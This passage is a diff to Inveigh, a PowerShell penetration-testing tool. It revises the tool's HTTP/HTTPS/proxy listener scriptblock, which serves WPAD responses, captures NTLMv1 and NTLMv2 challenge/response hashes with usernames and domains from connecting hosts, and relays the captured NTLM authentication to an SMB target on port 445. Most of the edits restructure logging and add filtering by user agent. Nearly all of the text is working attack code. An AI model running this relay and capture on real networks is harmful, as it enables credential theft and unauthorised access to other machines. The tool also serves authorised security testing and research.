                         $inveigh.console_queue.Add("SMB relay failed on $Target")
-                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay failed on $Target")])
                         $SMB_client_stage = 'Exit'
+
+                        if($inveigh.file_output)
+                        {
+                            $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay failed on $Target")
+                        }
+
+                        if($inveigh.log_output)
+                        {
+                            $inveigh.log.Add("$(Get-Date -format 's') - SMB relay failed on $Target")
+                        }
+
                     }
 
                 }
@@ -2550,9 +2783,19 @@ $SMB_relay_response_scriptblock =
 
             if(!$SMB_relay_failed -and $RelayAutoDisable -eq 'Y')
             {
-                $inveigh.SMB_relay = $false
                 $inveigh.console_queue.Add("SMB relay auto disabled due to success")
-                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay auto disabled due to success")])
+                $inveigh.SMB_relay = $false
+
+                if($inveigh.file_output)
+                {
+                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay auto disabled due to success")
+                }
+
+                if($inveigh.log_output)
+                {
+                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay auto disabled due to success")
+                }
+
             }
 
         }
@@ -2564,10 +2807,10 @@ $SMB_relay_response_scriptblock =
 
 }
 
-# HTTP/HTTPS Server ScriptBlock
+# HTTP/HTTPS/Proxy Server ScriptBlock
 $HTTP_scriptblock = 
 { 
-    param ($Challenge,$Command,$HTTPIP,$HTTPPort,$HTTPS_listener,$ProxyIgnore,$proxy_listener,$RelayAutoDisable,$Service,$SMB_version,$Target,$WPADAuth,$WPADResponse)
+    param ($Challenge,$Command,$HTTPIP,$HTTPPort,$HTTPS_listener,$ProxyIgnore,$proxy_listener,$RelayAutoDisable,$Service,$SMB_version,$Target,$WPADAuth,$WPADAuthIgnore,$WPADResponse)
 
     function NTLMChallengeBase64
     {
@@ -2640,6 +2883,8 @@ $HTTP_scriptblock =
 
     $HTTP_running = $true
     $HTTP_listener = New-Object System.Net.Sockets.TcpListener $HTTP_endpoint
+    $HTTP_client_close = $true
+    $relay_step = 0
 
     if($proxy_listener)
     {
@@ -2654,23 +2899,35 @@ $HTTP_scriptblock =
     catch
     {
         $inveigh.console_queue.Add("$(Get-Date -format 's') - Error starting $HTTP_type listener")
-        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting $HTTP_type listener")])
         $HTTP_running = $false
-    }
 
-    $HTTP_client_close = $true
-    $relay_step = 0
+        if($inveigh.file_output)
+        {
+            $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Error starting $HTTP_type listener")
+        }
+
+        if($inveigh.log_output)
+        {
+            $inveigh.log.Add("$(Get-Date -format 's') - Error starting $HTTP_type listener")
+        }
+
+    }
 
     :HTTP_listener_loop while($inveigh.relay_running -and $HTTP_running)
     {
         $TCP_request = ""
         $TCP_request_bytes = New-Object System.Byte[] 4096
+        $HTTP_send = $true
         $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("text/html")
         $HTTP_header_cache_control = ""
         $HTTP_header_authenticate = ""
         $HTTP_header_authenticate_data = ""
         $HTTP_message = ""
         $HTTP_header_authorization =  ""
+        $HTTP_header_host = ""
+        $HTTP_header_user_agent = ""
+        $HTTP_request_raw_URL = ""
+        $NTLM = "NTLM"
         
         while(!$HTTP_listener.Pending() -and !$HTTP_client.Connected)
         {
@@ -2690,9 +2947,19 @@ $HTTP_scriptblock =
             if($relay_reset -gt 2)
             {
                 $inveigh.console_queue.Add("SMB relay attack resetting")
-                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay attack resetting")])
                 $SMB_relay_socket.Close()
                 $relay_step = 0
+
+                if($inveigh.file_output)
+                {
+                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay attack resetting")
+                }
+
+                if($inveigh.log_output)
+                {
+                    $inveigh.log.Add("$(Get-Date -format 's') - SMB relay attack resetting")
+                }
+
             }
 
         }
@@ -2745,6 +3012,61 @@ $HTTP_scriptblock =
             $HTTP_raw_URL = $TCP_request.Substring($TCP_request.IndexOf("-20-") + 4,$TCP_request.Substring($TCP_request.IndexOf("-20-") + 1).IndexOf("-20-") - 3)
             $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
             $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
+            $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString
+
+            if($TCP_request -like "*-48-6F-73-74-3A-20-*")
+            {
+                $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf("-48-6F-73-74-3A-20-") + 19)
+                $HTTP_header_host_extract = $HTTP_header_host_extract.Substring(0,$HTTP_header_host_extract.IndexOf("-0D-0A-"))
+                $HTTP_header_host_extract = $HTTP_header_host_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                $HTTP_header_host = New-Object System.String ($HTTP_header_host_extract,0,$HTTP_header_host_extract.Length)
+            }
+
+            if($TCP_request -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
+            {
+                $HTTP_header_user_agent_extract = $TCP_request.Substring($TCP_request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37)
+                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Substring(0,$HTTP_header_user_agent_extract.IndexOf("-0D-0A-"))
+                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                $HTTP_header_user_agent = New-Object System.String ($HTTP_header_user_agent_extract,0,$HTTP_header_user_agent_extract.Length)
+            }
+
+            if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
+            {
+                $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
+                $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP")
+                $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent")
+
+                if($inveigh.file_output)
+                {
+                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
+                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP")
+                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP")
+                }
+
+                if($inveigh.log_output)
+                {
+                    $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
+                    $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP")
+                    $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP")
+                }
+
+                if($ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
+                {
+                    $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP")
+
+                    if($inveigh.file_output)
+                    {
+                        $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP")
+                    }
+
+                    if($inveigh.log_output)
+                    {
+                        $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request due to user agent from $HTTP_source_IP")
+                    }
+
+                }
+
+            }
 
             if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
             {
@@ -2754,10 +3076,12 @@ $HTTP_scriptblock =
                 $HTTP_header_authorization = New-Object System.String ($HTTP_header_authorization_extract,0,$HTTP_header_authorization_extract.Length)
             }
 
-            if(($HTTP_request_raw_URL -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous'))
+            if(($HTTP_request_raw_URL -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (
+            $HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -like 'NTLM*' -and $WPADAuthIgnore.Count -gt 0 -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
             {
                 $HTTP_response_status_code = 0x32,0x30,0x30
                 $HTTP_response_phrase = 0x4f,0x4b
+                $HTTP_client_close = $true
             }
             else
             {
@@ -2774,71 +3098,34 @@ $HTTP_scriptblock =
                 }
 
                 $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
-            }
-
-            $NTLM = "NTLM"
-            $NTLM_auth = $false
-            $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString
-
-            if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
-            {
-                $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
-                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")])
-
-                if($TCP_request -like "*-48-6F-73-74-3A-20-*")
-                {
-                    $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf("-48-6F-73-74-3A-20-") + 18)
-                    $HTTP_header_host_extract = $HTTP_header_host_extract.Substring(0,$HTTP_header_host_extract.IndexOf("-0D-0A-"))
-                    $HTTP_header_host_extract = $HTTP_header_host_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                    $HTTP_header_host = New-Object System.String ($HTTP_header_host_extract,0,$HTTP_header_host_extract.Length)
-                    $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP")
-                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type host header $HTTP_header_host received from $HTTP_source_IP")])
-                }
-
-                if($TCP_request -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
-                {
-                    $HTTP_header_user_agent_extract = $TCP_request.Substring($TCP_request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 36)
-                    $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Substring(0,$HTTP_header_user_agent_extract.IndexOf("-0D-0A-"))
-                    $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                    $HTTP_header_user_agent = New-Object System.String ($HTTP_header_user_agent_extract,0,$HTTP_header_user_agent_extract.Length)
-                    $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent")
-                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent $HTTP_header_user_agent received from $HTTP_source_IP")])
-
-                    if($ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | ForEach-Object{$HTTP_header_user_agent.contains($_)}))
-                    {
-                        $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request from $HTTP_source_IP")
-                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request from $HTTP_source_IP")])
-                    }
-
-                }
-
+                $HTTP_client_close = $false
             }
         
             if($HTTP_header_authorization.StartsWith('NTLM '))
             {
                 $HTTP_header_authorization = $HTTP_header_authorization -replace 'NTLM ',''
                 [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)
-
-                if($proxy_listener)
-                {
-                    $HTTP_response_status_code = 0x34,0x30,0x37
-                    $HTTP_header_authenticate = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
-                }
-                else
-                {
-                    $HTTP_response_status_code = 0x34,0x30,0x31
-                    $HTTP_header_authenticate = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
-                }
             
                 if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                 {
                 
                     if($inveigh.SMB_relay -and $HTTP_source_IP -ne $Target -and $relay_step -eq 0)
                     {
+
+                        if($inveigh.file_output)
+                        {
+                            $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by $HTTP_source_IP")
+                            $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Grabbing challenge for relay from " + $Target)
+                        }
+
+                        if($inveigh.log_output)
+                        {
+                            $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by $HTTP_source_IP")
+                            $inveigh.log.Add("$(Get-Date -format 's') - Grabbing challenge for relay from " + $Target)
+                        }
+
                         $inveigh.console_queue.Add("$HTTP_type to SMB relay triggered by $HTTP_source_IP at $(Get-Date -format 's')")
-                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by $HTTP_source_IP")])
                         $inveigh.console_queue.Add("Grabbing challenge for relay from $Target")
-                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Grabbing challenge for relay from " + $Target)])
                         $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
                         $SMB_relay_socket.Client.ReceiveTimeout = 60000
                         $SMB_relay_socket.Connect($Target,"445")
@@ -2848,8 +3135,18 @@ $HTTP_scriptblock =
                         if(!$SMB_relay_socket.connected)
                         {
                             $inveigh.console_queue.Add("SMB relay target is not responding")
-                            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay target is not responding")])
                             $relay_step = 0
+
+                            if($inveigh.file_output)
+                            {
+                                $inveigh.log_file_queue.Add("$(Get-Date -format 's') - SMB relay target is not responding")
+                            }
+
+                            if($inveigh.log_output)
+                            {
+                                $inveigh.log.Add("$(Get-Date -format 's') - SMB relay target is not responding")
+                            }
+
                         }
 
                         if($relay_step -eq 1)
@@ -2900,10 +3197,21 @@ $HTTP_scriptblock =
                             $NTLM_challenge = SMBNTLMChallenge $SMB_relay_bytes
                             $inveigh.HTTP_challenge_queue.Add($HTTP_source_IP + $HTTP_client.Client.RemoteEndpoint.Port + ',' + $NTLM_challenge)
                             $inveigh.console_queue.Add("Received challenge $NTLM_challenge for relay from $Target")
-                            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $Target")])
-                            $inveigh.console_queue.Add("Providing challenge $NTLM_challenge for relay to " + $HTTP_source_IP)
-                            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to " + $HTTP_source_IP)])
+                            $inveigh.console_queue.Add("Providing challenge $NTLM_challenge for relay to $HTTP_source_IP")
                             $relay_step = 2
+
+                            if($inveigh.file_output)
+                            {
+                                $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $Target")
+                                $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to $HTTP_source_IP")
+                            }
+
+                            if($inveigh.log_output)
+                            {
+                                $inveigh.log.Add("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $Target")
+                                $inveigh.log.Add("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to $HTTP_source_IP")
+                            }
+
                         }
                         else
                         {
@@ -2919,7 +3227,6 @@ $HTTP_scriptblock =
                 }
                 elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
                 {
-                    $NTLM = 'NTLM'
                     $HTTP_NTLM_length = DataLength2 20 $HTTP_request_bytes
                     $HTTP_NTLM_offset = DataLength4 24 $HTTP_request_bytes
                     $HTTP_NTLM_domain_length = DataLength2 28 $HTTP_request_bytes
@@ -2961,9 +3268,18 @@ $HTTP_scriptblock =
                         $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                     
                         if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
-                        {    
-                            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type $NTLM_type challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP ($HTTP_NTLM_host_string)")])      
+                        {     
                             $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash)
+
+                            if($inveigh.file_output)
+                            {
+                                $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type $NTLM_type challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
+                            }
+
+                            if($inveigh.log_output)
+                            {
+                                $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_type $NTLM_type challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
+                            }
                         
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                             {
@@ -2971,7 +3287,7 @@ $HTTP_scriptblock =
                             }
                             else
                             {
-                                $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string) for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
+                                $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type $NTLM_type challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
                             }
 
                             if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
@@ -2997,8 +3313,17 @@ $HTTP_scriptblock =
                         
                         if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                         {
-                            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP ($HTTP_NTLM_host_string)")])
                             $inveigh.NTLMv2_list.Add($HTTP_NTLM_hash)
+
+                            if($inveigh.file_output)
+                            {
+                                $inveigh.log_file_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
+                            }
+
+                            if($inveigh.log_output)
+                            {
+                                $inveigh.log.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string)")
+                            }
                         
                             if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                             {
@@ -3006,7 +3331,7 @@ $HTTP_scriptblock =
                             }
                             else
                             {
-                                $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string) for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
+                                $inveigh.console_queue.Add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from $HTTP_source_IP ($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string - not unique")
                             }
 
                             if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
@@ -3026,7 +3351,6 @@ $HTTP_scriptblock =
                 
                     $HTTP_response_status_code = 0x32,0x30,0x30
                     $HTTP_response_phrase = 0x4f,0x4b
-                    $NTLM_auth = $true
                     $HTTP_client_close = $true
                     $NTLM_challenge = ""
                 
@@ -3042,26 +3366,35 @@ $HTTP_scriptblock =
                                 if($inveigh.SMBRelay_failed_list -notcontains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $Target")
                                 {
 
-                                    if($NTLM_type -eq 'NTLMv2')
+                                    if($inveigh.file_output)
                                     {
-                                        $inveigh.console_queue.Add("Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $Target")
-                                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $Target")])
-                                        SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_version $SMB_user_ID $SMB_session_ID
-                                        $relay_step = 0
+                                        $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $Target")
                                     }
-                                    else
+
+                                    if($inveigh.log_output)
                                     {
-                                        $inveigh.console_queue.Add("Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $Target")
-                                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $Target")])
-                                        SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_version $SMB_user_ID $SMB_session_ID
-                                        $relay_step = 0
+                                        $inveigh.log.Add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $Target")
                                     }
+
+                                    $inveigh.console_queue.Add("Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $Target")
+                                    SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_version $SMB_user_ID $SMB_session_ID
+                                    $relay_step = 0
 
                                 }
                                 else
                                 {
+
+                                    if($inveigh.file_output)
+                                    {
+                                        $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $Target")
+                                    }
+
+                                    if($inveigh.log_output)
+                                    {
+                                        $inveigh.log.Add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $Target")
+                                    }
+
                                     $inveigh.console_queue.Add("Aborting SMB relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $Target")
-                                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $Target")])
                                     $SMB_relay_socket.Close()
                                     $relay_step = 0
                                 }
@@ -3069,8 +3402,18 @@ $HTTP_scriptblock =
                             }
                             else
                             {
+                                
+                                if($inveigh.file_output)
+                                {
+                                    $inveigh.log_file_queue.Add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_user_string appears to be a machine account")
+                                }
+
+                                if($inveigh.log_output)
+                                {
+                                    $inveigh.log.Add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_user_string appears to be a machine account")
+                                }
+
                                 $inveigh.console_queue.Add("Aborting SMB relay since $HTTP_NTLM_user_string appears to be a machine account")
-                                $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_user_string appears to be a machine account")])
                                 $SMB_relay_socket.Close()
                                 $relay_step = 0
                             }
@@ -3078,8 +3421,18 @@ $HTTP_scriptblock =
                         }
                         else
                         {
+
+                            if($inveigh.file_output)
+                            {
+                                $inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")
+                            }
+
+                            if($inveigh.log_output)
+                            {
+                                $inveigh.log.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")   
+                            }
+
                             $inveigh.console_queue.Add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on SMB relay username list")
-                            $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")])
                             $SMB_relay_socket.Close()
                             $relay_step = 0
                         }
@@ -3088,32 +3441,18 @@ $HTTP_scriptblock =
 
                     if($proxy_listener)
                     {
-                        $HTTP_client.Client.Close()
+                        $HTTP_send = $false
                     }
 
                 }
                 else
                 {
-                    $NTLM = "NTLM"
                     $HTTP_client_close = $false
                 }
         
             }
-            else
-            {
-            
-                if($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous')
-                {
-                    $HTTP_client_close = $true
-                }
-                else
-                {
-                    $HTTP_client_close = $false
-                }
 
-            }
-
-            if(!$proxy_listener -and $WPADResponse -and $HTTP_request_raw_URL -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | ForEach-Object{$HTTP_header_user_agent.contains($_)})))
+            if(!$proxy_listener -and $WPADResponse -and $HTTP_request_raw_URL -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
             {
                 $HTTP_message = $WPADResponse
                 $HTTP_header_content_type = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("application/x-ns-proxy-autoconfig")
@@ -3124,14 +3463,9 @@ $HTTP_scriptblock =
             $HTTP_header_content_length = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes($HTTP_message.Length)
             $HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)
 
-            if($HTTP_request_raw_URL -notmatch '/wpad.dat' -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$NTLM_auth)
+            if($HTTP_request_raw_URL -notmatch '/wpad.dat' -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$HTTP_client_close)
             { 
                 $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
-            }
-            else
-            {
-                $HTTP_response_status_code = 0x32,0x30,0x30
-                $HTTP_response_phrase = 0x4f,0x4b
             }
 
             $packet_HTTPResponse = New-Object System.Collections.Specialized.OrderedDictionary
@@ -3157,17 +3491,30 @@ $HTTP_scriptblock =
                 $packet_HTTPResponse.Add("HTTPResponse_CacheControl",$HTTP_header_cache_control + [Byte[]](0x0d,0x0a))
             }
 
-            $packet_HTTPResponse.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $HTTP_message_bytes)
-            $HTTP_response = ConvertFrom-PacketOrderedDictionary $packet_HTTPResponse
-            $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)
-            $HTTP_stream.Flush()
+            if($HTTP_send)
+            {
+                $packet_HTTPResponse.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $HTTP_message_bytes)
+                $HTTP_response = ConvertFrom-PacketOrderedDictionary $packet_HTTPResponse
+                $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)
+                $HTTP_stream.Flush()
+            }
+
             Start-Sleep -m 10
             $HTTP_request_raw_URL_old = $HTTP_request_raw_URL
             $HTTP_client_handle_old = $HTTP_client.Client.Handle
 
             if($HTTP_client_close)
             {
-                $HTTP_client.Close()
+
+                if($proxy_listener)
+                {
+                    $HTTP_client.Client.Close()
+                }
+                else
+                {
+                    $HTTP_client.Close()
+                }
+
             }
 
         }
@@ -3188,9 +3535,10 @@ $HTTP_scriptblock =
     $HTTP_listener.Stop()
 }
 
+# Control Relay Loop ScriptBlock
 $control_relay_scriptblock = 
 {
-    param ($RelayAutoExit,$RunTime)
